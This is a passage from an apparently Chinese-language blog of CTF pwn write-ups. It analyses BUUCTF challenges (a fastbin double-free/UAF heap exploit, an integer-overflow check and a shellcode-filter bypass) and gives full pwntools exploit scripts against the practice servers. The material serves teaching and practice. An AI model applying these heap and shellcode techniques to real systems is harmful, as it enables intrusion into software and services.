punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span> <span class="token number">0x4526a</span><span class="token punctuation">,</span> <span class="token number">0xf02a4</span><span class="token punctuation">,</span> <span class="token number">0xf1147</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Jump location?'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a><a href="https://buuoj.cn/challenges#gyctf_2020_some_thing_exceting">gyctf_2020_some_thing_exceting</a></h2><p><code>2.23</code>的堆题，利用了<code>double free</code>，感觉出题人很“脑洞大开”（思索</p><p>先检查保护，没开地址随机化</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gyctf_2020_some_thing_exceting  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/gyctf_2020_some_thing_exceting/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x3fe000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再来看程序，首先读取了<code>flag</code>并且保存在<code>bss</code>段的变量中</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Emmmmmm!Maybe you want Fool me!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  byte_6020A0 <span class="token operator">=</span> <span class="token number">96</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来就是常规的增删查，没有改，增加函数中创建了三个堆，其中应该是堆管理，还有两个分别是<code>ba</code>和<code>na</code>，嗯没错就是<code>banana</code>…</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> nbytes<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-24h] BYREF</span>  <span class="token keyword">int</span> nbytes_4<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-1Ch]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> ba's length : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> ba : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> na's length : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nbytes_4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> na : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>nbytes_4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v5<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes_4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> v5<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>删除操作中存在<code>UAF</code>漏洞</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> Banana ID : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查操作中输出的内容的地址是通过<code>ptr</code>这个堆管理中的地址来索引的</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> Banana ID : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> SCP project ID : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"# Banana's ba is %s\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"# Banana's na is %s\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过以上的分析可以大致想到本题的目的就是控制<code>ptr</code>堆管理中的堆指向的堆变成<code>bss</code>段上的<code>s</code>，并且通过<code>show</code>函数输出，通过<code>UAF</code>漏洞可以修改并申请<code>fast bin</code>中的堆地址，再输出就完成了，其中需要注意的是<code>fast bin</code>会检查申请的大小与取出的堆的<code>size</code>位是否一致，此时需要通过<code>find fake fast</code>寻找最近的<code>fake chunk</code>,并且需要使<code>size</code>和申请的堆大小一致</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> find_fake_fast 0x6020A8FAKE CHUNKSFake chunkAddr: 0x602098prev_size: 0x00size: 0x60 <span class="token punctuation">(</span>with flag bits: 0x60<span class="token punctuation">)</span>fd: 0x7365747b67616c66bk: 0xa7d74fd_nextsize: 0x00bk_nextsize: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该地址是<code>s - 0x10</code>，申请出来之后会要求向堆中写入内容，即向<code>s</code>写入，因为<code>flag</code>的格式开头第一个字母都是<code>f</code>，所以直接覆盖成<code>f</code>即可</p><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27418</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size1<span class="token punctuation">,</span> content1<span class="token punctuation">,</span> size2<span class="token punctuation">,</span> content2<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Now please tell me what you want to do :'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"ba's length : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size1<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'ba : '</span><span class="token punctuation">,</span> content1<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"na's length : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size2<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'na : '</span><span class="token punctuation">,</span> content2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Now please tell me what you want to do :'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Banana ID : > SCP project ID : '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Now please tell me what you want to do :'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Banana ID : '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">0x6020A8</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>flag <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'f'</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'f'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'f'</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'f'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="wustctf2020-number-game"><a href="#wustctf2020-number-game" class="headerlink" title="wustctf2020_number_game"></a><a href="https://buuoj.cn/challenges#wustctf2020_number_game">wustctf2020_number_game</a></h2><p>这题…看题目就能猜到应该是整型溢出，没开地址随机化</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wustctf2020_number_game  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/wustctf2020_number_game/pwn'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看程序，要求数值小于零，直接上网查了<code>32</code>位的最小值<code>-2147483648</code>，然后就对了，过程如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wustctf2020_number_game  <span class="token function">nc</span> node4.buuoj.cn <span class="token number">28416</span>                       __  ___    ______   ___      /  <span class="token operator">|</span>/  /__ /_  __/__<span class="token operator">&lt;</span>  /_ __ / /<span class="token operator">|</span>_/ / _ `// / / __/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span> //_/  /_/<span class="token punctuation">\</span>_,_//_/ /_/ /_//_<span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token parameter variable">-2147483648</span><span class="token function">cat</span> flagflag<span class="token punctuation">&#123;</span>a644cec2-87c2-43e0-93ac-d100b5bec8c5<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a><a href="https://buuoj.cn/challenges#starctf_2019_babyshell">starctf_2019_babyshell</a></h2><p>直接写入<code>shellcode</code>然后执行，需要注意的是有个检查</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_400786</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _BYTE <span class="token operator">*</span>i<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-10h]</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span>a1 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token operator">&amp;</span>loc_400978<span class="token punctuation">;</span> <span class="token operator">*</span>i <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>i <span class="token operator">!=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>      <span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>i <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token operator">++</span>a1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>限制太多了必须想办法绕过这个检查，可以想到通过<code>\x00</code>绕过，但是<code>\x00</code>执行不了，直接把给定字符串强制转换成<code>code</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.rodata:0000000000400978                               loc_400978:                             ; DATA XREF: check+8↑o.rodata:0000000000400978 5A                            pop     rdx.rodata:0000000000400979 5A                            pop     rdx.rodata:000000000040097A 4A 20 6C 6F 76                and     [rdi+r13*2+76h], bpl.rodata:000000000040097F                               db      65h.rodata:000000000040097F 65 73 20                      jnb     short near ptr loc_40099B+7.rodata:000000000040097F.rodata:0000000000400982 73 68                         jnb     short near ptr unk_4009EC.rodata:0000000000400982.rodata:0000000000400984                               db      65h.rodata:0000000000400984 65 6C                         insb.rodata:0000000000400986 6C                            insb.rodata:0000000000400987 5F                            pop     rdi.rodata:0000000000400988 63 6F 64                      movsxd  ebp, dword ptr [rdi+64h].rodata:000000000040098B                               db      65h.rodata:000000000040098B 65 2C 61                      sub     al, 61h ; &#39;a&#39;.rodata:000000000040098E 6E                            outsb.rodata:000000000040098F 64 20 68 65                   and     fs:[rax+65h], ch.rodata:0000000000400993 72 65                         jb      short near ptr unk_4009FA.rodata:0000000000400993.rodata:0000000000400995 20 69 73                      and     [rcx+73h], ch.rodata:0000000000400998 20 61 20                      and     [rcx+20h], ah.rodata:000000000040099B.rodata:000000000040099B                               loc_40099B:                             ; CODE XREF: .rodata:000000000040097F↑j.rodata:000000000040099B 67 69 66 74 3A 0F 05 20       imul    esp, [esi+74h], 20050F3Ah.rodata:00000000004009A3 65 6E                         outs    dx, byte ptr gs:[rsi].rodata:00000000004009A5 6A 6F                         push    6Fh ; &#39;o&#39;.rodata:00000000004009A7 79 20                         jns     short near ptr format+3         ; &quot;ng shellcode!&quot;.rodata:00000000004009A7.rodata:00000000004009A7                               ; ---------------------------------------------------------------------------.rodata:00000000004009A9 69                            db  69h ; i.rodata:00000000004009AA                               ; ---------------------------------------------------------------------------.rodata:00000000004009AA 74 21                         jz      short near ptr format+7         ; &quot;hellcode!&quot;.rodata:00000000004009AA.rodata:00000000004009AC 0A 00                         or      al, [rax]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原字符串中含有<code>\x0f\x05</code>,即<code>syscall</code>，想到执行<code>sys read</code>，但是构造的中途就有<code>\x00</code>了，能正常执行就行，直接加<code>shellcode</code></p><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">29397</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span 